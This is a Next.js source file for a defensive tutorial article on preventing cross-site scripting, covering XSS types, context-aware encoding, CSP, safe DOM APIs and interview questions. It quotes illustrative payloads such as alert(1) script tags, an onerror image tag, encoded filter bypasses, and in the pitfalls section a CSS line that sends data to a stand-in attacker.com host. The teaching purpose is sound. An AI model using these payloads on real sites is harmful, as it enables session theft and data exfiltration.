"use client";

import { ArticleLayout } from "@/components/articles/ArticleLayout";
import { ArticleImage } from "@/components/articles/ArticleImage";
import type { ArticleMetadata } from "@/types/article";

export const metadata: ArticleMetadata = {
  id: "article-backend-xss-prevention-extensive",
  title: "XSS Prevention",
  description:
    "Staff-level deep dive into Cross-Site Scripting attack vectors, context-aware output encoding, Content Security Policy, safe DOM APIs, and the operational practice of preventing XSS at scale.",
  category: "backend",
  subcategory: "security-authentication",
  slug: "xss-prevention",
  wordCount: 5500,
  readingTime: 22,
  lastUpdated: "2026-04-04",
  tags: ["backend", "security", "xss", "web-security", "csp", "encoding"],
  relatedTopics: ["csrf-protection", "sql-injection-prevention", "input-validation-sanitization", "security-headers"],
};

export default function ArticlePage() {
  return (
    <ArticleLayout metadata={metadata}>
      {/* ============================================================
          SECTION 1: Definition and Context
          ============================================================ */}
      <section>
        <h2>Definition and Context</h2>
        <p>
          <strong>XSS (Cross-Site Scripting)</strong> is a vulnerability that allows an attacker to inject malicious
          scripts into web pages viewed by other users. When a user visits the compromised page, the malicious script
          executes in their browser with the same privileges as the legitimate page — allowing the attacker to steal
          session cookies, impersonate the user, modify page content, redirect to phishing sites, or perform any
          action the user is authorized to perform.
        </p>
        <p>
          XSS is consistently ranked as one of the most common and impactful web vulnerabilities. According to
          OWASP, XSS accounts for approximately 40 percent of all web application security vulnerabilities. XSS
          attacks are particularly dangerous because they execute in the victim&apos;s browser with the victim&apos;s
          authentication context — the server sees the requests as legitimate, and standard server-side security
          controls (authentication, authorization) cannot distinguish between legitimate and malicious requests.
        </p>
        <p>
          There are three types of XSS: reflected XSS (the malicious script is reflected from the server&apos;s response,
          typically via a URL parameter), stored XSS (the malicious script is stored on the server, typically in a
          database, and served to all users who view the affected page), and DOM-based XSS (the malicious script is
          executed by client-side JavaScript without involving the server&apos;s response — the vulnerability is entirely
          in the client-side code). Each type requires different detection and prevention strategies, but the
          fundamental defense — output encoding — applies to all three.
        </p>
        <div className="my-6 rounded-lg border border-theme bg-panel-soft p-5">
          <h3 className="text-lg font-semibold mb-3">What XSS Can Do</h3>
          <p className="text-muted mb-3">
            <strong>Session hijacking:</strong> Steal session cookies (document.cookie) and impersonate the victim&apos;s session.
          </p>
          <p className="text-muted mb-3">
            <strong>Keylogging:</strong> Capture keystrokes (keyboard event listeners) to steal passwords and sensitive data.
          </p>
          <p className="text-muted mb-3">
            <strong>Phishing:</strong> Modify page content to display fake login forms or misleading information.
          </p>
          <p className="text-muted mb-3">
            <strong>CSRF amplification:</strong> XSS bypasses CSRF protections because the script executes in the context of the legitimate page, including valid CSRF tokens.
          </p>
          <p>
            <strong>Worm propagation:</strong> Self-replicating XSS (e.g., Samy worm on MySpace, 2005) spreads by injecting itself into other users&apos; profiles, infecting millions of users within hours.
          </p>
        </div>
        <p>
          The evolution of XSS prevention has been shaped by increasingly sophisticated attacks. Early defenses
          relied on input filtering (stripping &lt;script&gt; tags), which was easily bypassed (event handlers,
          javascript: URLs, encoding tricks). The modern approach is context-aware output encoding — encoding
          user input differently depending on where it is placed in the HTML (HTML body, attributes, JavaScript,
          CSS, URLs). Additionally, Content Security Policy (CSP) provides a browser-enforced defense-in-depth
          layer — even if XSS is injected, CSP blocks its execution.
        </p>
      </section>

      {/* ============================================================
          SECTION 2: Core Concepts
          ============================================================ */}
      <section>
        <h2>Core Concepts</h2>
        <p>
          Reflected XSS occurs when user input is reflected in the server&apos;s response without proper encoding. For
          example, a search page that displays the search query in the response: &lt;p&gt;Results for: USER_INPUT&lt;/p&gt;.
          If the user input is &lt;script&gt;alert(1)&lt;/script&gt; and the server reflects it without encoding, the script
          executes in the user&apos;s browser. Reflected XSS requires the victim to click a malicious link — the attack
          is not persistent and only affects users who click the link.
        </p>
        <p>
          Stored XSS occurs when user input is stored on the server (database, file system) and served to other users
          without proper encoding. For example, a comment system that stores user comments and displays them to all
          users who view the page. If an attacker submits a comment containing a malicious script, the script is
          stored and executed for every user who views the page. Stored XSS is more dangerous than reflected XSS
          because it affects all users who view the affected page, not just those who click a malicious link.
        </p>
        <ArticleImage
          src="/diagrams/system-design-concepts/backend/security-authentication/xss-prevention-diagram-1.svg"
          alt="XSS attack types showing reflected, stored, and DOM-based XSS with their injection points and persistence"
          caption="XSS types: reflected (immediate reflection via URL), stored (persistent via database), and DOM-based (client-side JavaScript processing). Each type requires different detection and prevention strategies."
        />
        <p>
          DOM-based XSS occurs when client-side JavaScript processes user input (URL parameters, hash, referrer)
          and writes it to the DOM using unsafe APIs (innerHTML, document.write, outerHTML). Unlike reflected and
          stored XSS, DOM-based XSS does not involve the server&apos;s response — the vulnerability is entirely in the
          client-side code. For example, a page that reads document.location.hash and writes it to innerHTML is
          vulnerable to DOM-based XSS — the attacker crafts a URL with a malicious hash, and the victim&apos;s browser
          executes the script.
        </p>
        <p>
          Output encoding is the primary defense against XSS — it transforms user input so that it is displayed as
          text rather than executed as code. The encoding depends on the context where the input is placed: HTML
          body encoding (&lt; → &amp;lt;, &gt; → &amp;gt;, &amp; → &amp;amp;, &quot; → &amp;quot;) for content within HTML elements, attribute
          encoding (&quot; → &amp;quot;, &apos; → &amp;#x27;) for content within HTML attributes, JavaScript encoding (\xHH hex
          encoding) for content within JavaScript strings, URL encoding (%XX) for content within URLs, and CSS
          encoding (\HH) for content within CSS.
        </p>
        <ArticleImage
          src="/diagrams/system-design-concepts/backend/security-authentication/xss-prevention-diagram-2.svg"
          alt="XSS defense in depth showing input validation, output encoding, CSP, and safe DOM APIs as layered protection"
          caption="XSS defense in depth: input validation (reject malicious input), output encoding (encode for context), CSP (block script execution), and safe DOM APIs (avoid innerHTML). No single defense is sufficient."
        />
        <p>
          Content Security Policy (CSP) is an HTTP response header that instructs the browser to only load resources
          from trusted sources. CSP can block inline scripts (script-src &apos;self&apos;), which prevents most XSS attacks
          because the injected script cannot execute. CSP also blocks external scripts from untrusted domains,
          preventing the attacker from loading malicious scripts from their own server. CSP is a defense-in-depth
          layer — it does not prevent XSS injection, but it prevents the injected script from executing.
        </p>
        <p>
          Safe DOM APIs are the client-side defense against XSS. Instead of using innerHTML or document.write
          (which interpret content as HTML and execute scripts), use textContent (which treats content as text),
          createElement (which creates elements safely), and setAttribute (which sets attributes with automatic
          encoding). Modern frameworks (React, Angular, Vue) use safe DOM APIs by default — they automatically
          escape content when rendering, preventing XSS unless the developer explicitly opts out (dangerouslySetInnerHTML
          in React, ng-bind-html in Angular, v-html in Vue).
        </p>
      </section>

      {/* ============================================================
          SECTION 3: Architecture and Flow
          ============================================================ */}
      <section>
        <h2>Architecture and Flow</h2>
        <p>
          The XSS prevention architecture consists of the input validator (which validates and sanitizes user
          input), the output encoder (which encodes user input for the appropriate context), the CSP middleware
          (which sets the Content-Security-Policy header), and the safe DOM API library (which provides safe
          alternatives to innerHTML and document.write). The input validator rejects obviously malicious input,
          the output encoder encodes user input before rendering, the CSP middleware blocks script execution from
          untrusted sources, and the safe DOM API library prevents client-side XSS.
        </p>
        <p>
          The input validation flow begins with the user submitting input (form data, URL parameter, API request).
          The input validator checks the input against a whitelist of allowed patterns (alphanumeric characters,
          specific symbols) and rejects input that contains obviously malicious content (&lt;script&gt;, javascript:,
          event handlers). The validated input is then stored or processed. Input validation is the first line of
          defense but is not sufficient on its own — attackers can bypass input validation using encoding tricks
          (URL encoding, HTML entity encoding, Unicode encoding).
        </p>
        <ArticleImage
          src="/diagrams/system-design-concepts/backend/security-authentication/xss-prevention-diagram-3.svg"
          alt="Context-aware output encoding showing different encoding strategies for HTML body, attributes, JavaScript, URL, and CSS contexts"
          caption="Context-aware encoding: HTML body uses entity encoding (&lt; → &amp;lt;), attributes use attribute encoding (&quot; → &amp;quot;), JavaScript uses hex encoding (\xHH), URLs use percent-encoding (%XX), and CSS uses hex escaping (\HH)."
        />
        <p>
          The output encoding flow begins with the server retrieving data (user input, database content) for
          rendering. The output encoder determines the context where the data will be placed (HTML body, attribute,
          JavaScript, URL, CSS) and applies the appropriate encoding. The encoded data is then rendered in the HTML.
          For example, if the data is placed in an HTML body, &lt; is encoded as &amp;lt;, &gt; is encoded as &amp;gt;, and
          &amp; is encoded as &amp;amp;. If the data is placed in an HTML attribute, &quot; is encoded as &amp;quot; and &apos;
          is encoded as &amp;#x27;.
        </p>
        <p>
          CSP enforcement begins with the server setting the Content-Security-Policy header in the HTTP response.
          The browser parses the CSP header and enforces the policy — blocking inline scripts (unless &apos;unsafe-inline&apos;
          is specified), blocking external scripts from untrusted domains (unless explicitly allowed), and blocking
          eval() and similar functions (unless &apos;unsafe-eval&apos; is specified). If the browser detects a CSP violation
          (an attempt to load a blocked resource), it blocks the request and optionally sends a violation report to
          a specified endpoint.
        </p>
        <p>
          Framework-level XSS prevention is implemented through auto-escaping templating engines (Twig, Jinja2,
          Thymeleaf) and safe DOM APIs in frontend frameworks (React, Angular, Vue). Auto-escaping templating
          engines automatically encode all variables rendered in templates — the developer must explicitly opt out
          of encoding (using a &quot;raw&quot; or &quot;safe&quot; filter) to render unencoded content. Safe DOM APIs in frontend
          frameworks treat all content as text by default — the developer must explicitly opt out of encoding (using
          dangerouslySetInnerHTML, ng-bind-html, or v-html) to render HTML content.
        </p>
      </section>

      {/* ============================================================
          SECTION 4: Trade-offs and Comparison
          ============================================================ */}
      <section>
        <h2>Trade-offs and Comparison</h2>
        <p>
          Input validation versus output encoding is a trade-off between prevention and mitigation. Input validation
          prevents malicious input from entering the system — it rejects obviously malicious content before it is
          stored. Output encoding encodes user input before rendering — it prevents stored content from executing
          as code. Input validation is the first line of defense but is not sufficient on its own (attackers can
          bypass it using encoding tricks). Output encoding is the primary defense but does not prevent malicious
          input from entering the system. The recommended approach is defense-in-depth — use both input validation
          and output encoding.
        </p>
        <p>
          CSP strict versus CSP relaxed is a trade-off between security and compatibility. A strict CSP
          (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;, no &apos;unsafe-eval&apos;) blocks most XSS attacks but may break legitimate
          functionality (inline scripts, third-party widgets, analytics scripts). A relaxed CSP (allowing
          &apos;unsafe-inline&apos;, &apos;unsafe-eval&apos;, or specific third-party domains) maintains compatibility but provides less
          XSS protection. The recommended approach is to use a strict CSP with nonce-based or hash-based allowances
          for specific inline scripts — this provides strong XSS protection while allowing legitimate inline scripts.
        </p>
        <p>
          Auto-escaping versus manual encoding is a trade-off between developer convenience and flexibility.
          Auto-escaping (templating engines that automatically encode all variables) is convenient — developers do
          not need to remember to encode each variable. However, auto-escaping may over-encode content that should
          be rendered as HTML (e.g., rich text content). Manual encoding gives developers full control — they can
          encode each variable appropriately for its context. However, manual encoding is error-prone — developers
          may forget to encode a variable, introducing an XSS vulnerability. The recommended approach is
          auto-escaping with explicit opt-out for trusted content (using a &quot;raw&quot; or &quot;safe&quot; filter).
        </p>
        <p>
          Framework XSS prevention (React, Angular, Vue) versus vanilla JavaScript is a trade-off between safety
          and control. Frameworks automatically escape content when rendering — they use safe DOM APIs
          (textContent, createElement) by default, preventing XSS unless the developer explicitly opts out
          (dangerouslySetInnerHTML, ng-bind-html, v-html). Vanilla JavaScript requires developers to manually use
          safe DOM APIs — it is easy to accidentally use innerHTML or document.write, introducing an XSS
          vulnerability. The recommended approach is to use a framework with auto-escaping for most applications.
        </p>
      </section>

      {/* ============================================================
          SECTION 5: Best Practices
          ============================================================ */}
      <section>
        <h2>Best Practices</h2>
        <p>
          Use context-aware output encoding for all user input — encode user input differently depending on where
          it is placed in the HTML (HTML body, attributes, JavaScript, URLs, CSS). Use a well-tested encoding
          library (OWASP Java Encoder, ESAPI, DOMPurify) — do not implement your own encoding, as it is easy to
          make mistakes (missing characters, incorrect encoding for context).
        </p>
        <p>
          Enable Content Security Policy (CSP) with a strict policy — set script-src &apos;self&apos; to block inline
          scripts and external scripts from untrusted domains. Use nonce-based or hash-based allowances for
          specific inline scripts (script-src &apos;self&apos; &apos;nonce-abc123&apos;) rather than allowing &apos;unsafe-inline&apos;.
          Monitor CSP violation reports to detect potential XSS attacks.
        </p>
        <p>
          Use safe DOM APIs — use textContent instead of innerHTML, createElement instead of document.write, and
          setAttribute instead of setting attributes directly. If you must use innerHTML (e.g., rendering rich text
          content), sanitize the content using a well-tested library (DOMPurify) that removes malicious content
          while preserving legitimate HTML.
        </p>
        <p>
          Use auto-escaping templating engines — configure your templating engine (Twig, Jinja2, Thymeleaf) to
          auto-escape all variables by default. Only opt out of encoding (using a &quot;raw&quot; or &quot;safe&quot; filter) for
          content that you trust and have sanitized. Never opt out of encoding for user-controlled content.
        </p>
        <p>
          Validate input using a whitelist approach — allow only expected patterns (alphanumeric characters,
          specific symbols) rather than blocking known-bad patterns (blacklist). Blacklists are easily bypassed
          (attackers can use encoding tricks, alternative syntaxes). Whitelists are more restrictive but more
          secure.
        </p>
        <p>
          Set HttpOnly and Secure flags on session cookies — the HttpOnly flag prevents JavaScript from reading
          the cookie (mitigating session cookie theft via XSS), and the Secure flag ensures the cookie is only
          sent over HTTPS. These flags do not prevent XSS, but they mitigate the impact of XSS by preventing
          session cookie theft.
        </p>
      </section>

      {/* ============================================================
          SECTION 6: Common Pitfalls
          ============================================================ */}
      <section>
        <h2>Common Pitfalls</h2>
        <p>
          Using blacklists for input validation is a common pitfall. Blacklists (blocking &lt;script&gt;, javascript:,
          onerror=) are easily bypassed — attackers can use encoding tricks (&#60;script&#62;, java&#115;cript:,
          onload=), alternative syntaxes (&lt;img src=x onerror=alert(1)&gt;), or case variations
          (&lt;ScRiPt&gt;). The fix is to use a whitelist approach — allow only expected patterns (alphanumeric
          characters, specific symbols) and reject everything else.
        </p>
        <p>
          Encoding in the wrong context is a common pitfall. User input placed in an HTML attribute but encoded
          for HTML body context is still vulnerable — an attacker can break out of the attribute using &quot; or &apos;
          and inject a malicious attribute (onerror=alert(1)). The fix is to use context-aware encoding — encode
          user input for the specific context where it is placed (HTML body, attribute, JavaScript, URL, CSS).
        </p>
        <p>
          Allowing user-controlled CSS is a common oversight. User-controlled CSS can be used to exfiltrate data
          (background-image: url(attacker.com/steal?data=...)) or perform clickjacking attacks (positioning
          transparent elements over legitimate buttons). The fix is to not allow user-controlled CSS, or to sanitize
          CSS using a well-tested library (CSS sanitizer) that removes dangerous properties.
        </p>
        <p>
          Using innerHTML with unsanitized content is a common pitfall. innerHTML interprets content as HTML and
          executes scripts — if the content contains user input, it is vulnerable to XSS. The fix is to use
          textContent (which treats content as text) or to sanitize the content using a well-tested library
          (DOMPurify) before setting innerHTML.
        </p>
        <p>
          Not setting CSP or setting a weak CSP is a common oversight. Without CSP, injected scripts execute
          freely. With a weak CSP (allowing &apos;unsafe-inline&apos;, &apos;unsafe-eval&apos;, or wildcard domains), the CSP provides
          minimal protection. The fix is to set a strict CSP (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;, no
          &apos;unsafe-eval&apos;) and use nonce-based or hash-based allowances for specific inline scripts.
        </p>
      </section>

      {/* ============================================================
          SECTION 7: Real-world Use Cases
          ============================================================ */}
      <section>
        <h2>Real-world Use Cases</h2>
        <p>
          A large e-commerce platform uses auto-escaping templating engines (Twig) for its web application — all
          variables rendered in templates are automatically encoded for the appropriate context. The platform sets
          a strict CSP (script-src &apos;self&apos; with nonce-based allowances for specific inline scripts) and monitors CSP
          violation reports for potential XSS attacks. The platform also uses DOMPurify to sanitize user-generated
          rich text content (product reviews, descriptions) before rendering. The platform has had zero successful
          XSS attacks since implementing these controls.
        </p>
        <p>
          A social media platform uses DOMPurify to sanitize user-generated content (posts, comments, profiles)
          before storing it in the database. The platform&apos;s frontend framework (React) uses safe DOM APIs by
          default, preventing DOM-based XSS. The platform sets a strict CSP (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;)
          and monitors CSP violation reports. The platform also implements a bug bounty program that rewards
          researchers for reporting XSS vulnerabilities.
        </p>
        <p>
          A financial services company uses context-aware output encoding for its banking application — all user
          input is encoded for the specific context where it is placed (HTML body, attributes, JavaScript, URLs).
          The company sets a strict CSP (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;, no &apos;unsafe-eval&apos;) and sets
          HttpOnly and Secure flags on all session cookies. The company monitors CSP violation reports and session
          cookie access attempts (which may indicate XSS attempts). The company has achieved PCI-DSS compliance in
          part due to its XSS prevention controls.
        </p>
        <p>
          A SaaS platform uses a combination of input validation (whitelist approach), output encoding (auto-escaping
          templating engine), and CSP (strict policy with nonce-based allowances) for its web application. The
          platform&apos;s frontend framework (Vue) uses safe DOM APIs by default, preventing DOM-based XSS. The platform
          monitors CSP violation reports and input validation failures for anomalous patterns (which may indicate
          XSS attack attempts). The platform has achieved SOC 2 compliance in part due to its XSS prevention
          controls.
        </p>
      </section>

      {/* ============================================================
          SECTION 8: Interview Questions
          ============================================================ */}
      <section>
        <h2>Interview Questions</h2>

        <div className="space-y-5">
          <div className="rounded-lg border border-theme bg-panel-soft p-5">
            <h3 className="text-lg font-semibold mb-3">Question 1: What is the difference between reflected, stored, and DOM-based XSS?</h3>
            <p className="text-muted mb-3"><strong>Answer:</strong></p>
            <p className="mb-3">
              Reflected XSS occurs when user input is reflected in the server&apos;s response without proper encoding — the malicious script is delivered via a URL parameter and executes when the victim clicks the malicious link. It is not persistent and only affects users who click the link.
            </p>
            <p className="mb-3">
              Stored XSS occurs when user input is stored on the server (database, file system) and served to other users without proper encoding — the malicious script is stored and executed for every user who views the affected page. It is persistent and affects all viewers.
            </p>
            <p>
              DOM-based XSS occurs when client-side JavaScript processes user input (URL parameters, hash, referrer) and writes it to the DOM using unsafe APIs (innerHTML, document.write) — the vulnerability is entirely in the client-side code, not the server&apos;s response. The server is not involved in the attack.
            </p>
          </div>

          <div className="rounded-lg border border-theme bg-panel-soft p-5">
            <h3 className="text-lg font-semibold mb-3">Question 2: What is context-aware output encoding, and why is it important?</h3>
            <p className="text-muted mb-3"><strong>Answer:</strong></p>
            <p className="mb-3">
              Context-aware output encoding encodes user input differently depending on where it is placed in the HTML. HTML body encoding (&lt; → &amp;lt;, &gt; → &amp;gt;) prevents script execution in HTML content. Attribute encoding (&quot; → &amp;quot;) prevents breaking out of attributes. JavaScript encoding (\xHH) prevents breaking out of JavaScript strings. URL encoding (%XX) prevents injecting malicious URLs. CSS encoding (\HH) prevents injecting malicious CSS.
            </p>
            <p>
              Context-aware encoding is important because using the wrong encoding for the context leaves the application vulnerable. For example, encoding user input for HTML body context but placing it in an HTML attribute allows an attacker to break out of the attribute using &quot; and inject a malicious attribute (onerror=alert(1)).
            </p>
          </div>

          <div className="rounded-lg border border-theme bg-panel-soft p-5">
            <h3 className="text-lg font-semibold mb-3">Question 3: How does Content Security Policy (CSP) prevent XSS?</h3>
            <p className="text-muted mb-3"><strong>Answer:</strong></p>
            <p className="mb-3">
              CSP prevents XSS by instructing the browser to only load resources from trusted sources. A strict CSP (script-src &apos;self&apos;) blocks inline scripts and external scripts from untrusted domains — even if an attacker injects a malicious script, the browser blocks its execution. CSP can also block eval() (script-src &apos;self&apos; without &apos;unsafe-eval&apos;), preventing code injection via eval().
            </p>
            <p>
              CSP is a defense-in-depth layer — it does not prevent XSS injection, but it prevents the injected script from executing. CSP should be used in conjunction with output encoding and input validation, not as a replacement for them.
            </p>
          </div>

          <div className="rounded-lg border border-theme bg-panel-soft p-5">
            <h3 className="text-lg font-semibold mb-3">Question 4: What is the difference between innerHTML and textContent, and why does it matter for XSS?</h3>
            <p className="text-muted mb-3"><strong>Answer:</strong></p>
            <p className="mb-3">
              innerHTML interprets content as HTML and executes scripts — if the content contains user input, it is vulnerable to XSS. textContent treats content as text — it does not interpret content as HTML, so scripts are not executed. For example, setting innerHTML to &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; executes the script, while setting textContent to the same value displays it as text.
            </p>
            <p>
              The fix is to use textContent (or createElement, setAttribute) instead of innerHTML. If you must use innerHTML (e.g., rendering rich text content), sanitize the content using a well-tested library (DOMPurify) that removes malicious content while preserving legitimate HTML.
            </p>
          </div>

          <div className="rounded-lg border border-theme bg-panel-soft p-5">
            <h3 className="text-lg font-semibold mb-3">Question 5: How do you sanitize user-generated rich text content (HTML) safely?</h3>
            <p className="text-muted mb-3"><strong>Answer:</strong></p>
            <p className="mb-3">
              Use a well-tested sanitization library (DOMPurify, sanitize-html, Bleach) that removes dangerous elements (&lt;script&gt;, &lt;iframe&gt;, &lt;object&gt;), dangerous attributes (onerror, onload, onclick), and dangerous URLs (javascript:, data:). The library should preserve legitimate HTML (paragraphs, links, images, formatting) while removing malicious content.
            </p>
            <p>
              Configure the sanitizer with a whitelist of allowed elements and attributes — allow only the HTML elements and attributes that your application needs (p, a, img, b, i, u, ul, ol, li) and block everything else. Regularly update the sanitization library to protect against newly discovered bypass techniques.
            </p>
          </div>
        </div>
      </section>

      {/* ============================================================
          SECTION 9: References
          ============================================================ */}
      <section>
        <h2>References &amp; Further Reading</h2>
        <ul className="space-y-2">
          <li>
            <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              OWASP XSS Prevention Cheat Sheet
            </a> — Comprehensive XSS defense recommendations.
          </li>
          <li>
            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              MDN: Content Security Policy (CSP)
            </a> — CSP documentation and examples.
          </li>
          <li>
            <a href="https://github.com/cure53/DOMPurify" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              DOMPurify
            </a> — Industry-standard HTML sanitization library.
          </li>
          <li>
            <a href="https://portswigger.net/web-security/cross-site-scripting" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              PortSwigger: XSS Vulnerabilities
            </a> — XSS attack techniques and defenses.
          </li>
          <li>
            <a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              OWASP Input Validation Cheat Sheet
            </a> — Whitelist-based input validation guide.
          </li>
          <li>
            <a href="https://www.google.com/about/appsecurity/learning/xss/" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
              Google: XSS Prevention
            </a> — Interactive XSS prevention training.
          </li>
        </ul>
      </section>
    </ArticleLayout>
  );
}